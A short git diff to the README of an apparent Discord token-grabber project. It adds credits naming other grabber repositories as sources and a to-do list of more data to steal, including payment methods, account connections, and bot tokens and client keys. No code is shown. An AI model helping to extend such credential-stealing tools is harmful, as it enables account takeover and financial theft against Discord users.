@@ -46,3 +46,9 @@ Here is a list of steps to follow to setup this simple NodeJS server to hide the
 # Credits
 >Serverfile.js blatantly skidded from my boi <a href="https://github.com/Gayarra_Frost/DiscordTokenGrabber">Fubukii</a><br>
 >Regex matching part stolen from <a href="https://github.com/Its-Vichy/Batched-Grabber">Batched</a>
+
+# Todo
+>Rare Friends Info
+>Payment Methods(full list in separated embeds)
+>Connections(full list in separated embeds)
+>Applications(Only Bot ID, Client Key, Public Key and Bot Tokens)
